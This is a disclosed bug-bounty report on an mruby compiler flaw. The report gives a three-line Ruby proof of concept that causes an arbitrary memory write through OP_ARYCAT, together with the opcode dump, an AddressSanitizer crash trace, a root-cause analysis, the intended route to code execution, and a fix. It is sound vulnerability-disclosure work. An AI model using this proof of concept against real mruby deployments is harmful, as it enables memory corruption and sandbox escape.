# OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write

## Report Details
- **Report ID**: 226200
- **URL**: https://hackerone.com/reports/226200
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-05-04T21:23:52.791Z
- **Disclosed**: 2017-05-30T14:36:40.301Z

## Reporter
- **Username**: avisaven
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
# PoC

	x = 0x4242422a
	a = *(_&.__=0)
	a = *(_&.__=0)
    
# Generated Opcodes
	irep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0
	file: crashes/b.rb
	    3 000 OP_LOADL	R1	L(0)	; 1111638570	; R1:x
	    4 001 OP_ARRAY	R3	R3	0
	    4 002 OP_LOADI	R4	0
	    4 003 OP_ARYCAT	R2	R3		; R2:a
	    5 004 OP_ARRAY	R2	R2	0	; R2:a R2:a
	    5 005 OP_LOADI	R3	0
	    5 006 OP_ARYCAT	R1	R2		; R1:x R2:a
	    5 007 OP_MOVE	R2	R1		; R2:a R1:x
	    5 008 OP_STOP

# AddressSanitizer

    unknown lhs 30
    unknown lhs 30
    ASAN:SIGSEGV
    =================================================================
    ==17426==ERROR: AddressSanitizer: SEGV on unknown address 0x000042424242 (pc 0x00010e982109 bp 0x7fff5127b430 sp 0x7fff5127b350 T0)
        #0 0x10e982108 in ary_concat array.c:265
        #1 0x10e981faf in mrb_ary_concat array.c:284
        #2 0x10eb9d788 in mrb_vm_exec vm.c:2404
        #3 0x10eb71298 in mrb_vm_run vm.c:860
        #4 0x10ebaea21 in mrb_top_run vm.c:2733
        #5 0x10ecc118a in mrb_load_exec parse.y:5780
        #6 0x10ecc1ef1 in mrb_load_file_cxt parse.y:5789
        #7 0x10e97cdfc in main mruby.c:227
        #8 0x7fff8f70d5c8 in start (/usr/lib/system/libdyld.dylib+0x35c8)
        #9 0x1  (<unknown module>)

    AddressSanitizer can not provide additional info.
    SUMMARY: AddressSanitizer: SEGV array.c:265 ary_concat
    ==17426==ABORTING
    [2]    17426 abort      ./mruby/bin/mruby crashes/b.rb

# Analysis
In `gen_assignment`, `return;` is used for the `default` case when doing the code generation (line 1029 in mrbgems/mruby-compiler/core/codegen.c). When the LHS is an `NODE_SCALL` it goes to the base case. It returns and never gets to the bottom line `if (val) push(val);` which is necessary for the rest of the code to use the correct register. Because it is not pushed, it uses the register below it in the stack, which allows us to manipulate arguments in an unchecked manner to other opcodes.

If this is used in conjunction with `OP_ARYCAT` from the splat operator, one could point the destination of OP_ARYCAT to a fake RArray with any arbitrary memory as the ptr, resulting in a memory write (I'm currently experimenting with this to corrupt strings and get code execution). 

# Solution
In order to fix this, either having the error for improper LHS code generation should either be fatal and kill the program, or switching `return;` to `break;` will fix the error. However, in the future, there should be some level of verification the the destination of `OP_ARYCAT` is actually an RArray to prevent it being used in memory corruptions.

# Versions Affected

The code above was tested on the latest master. The bug itself appears to have been created in commit `88cd807379152ea3fec5f534e5f4d6ebebd53982`.

## Attachments
No attachments
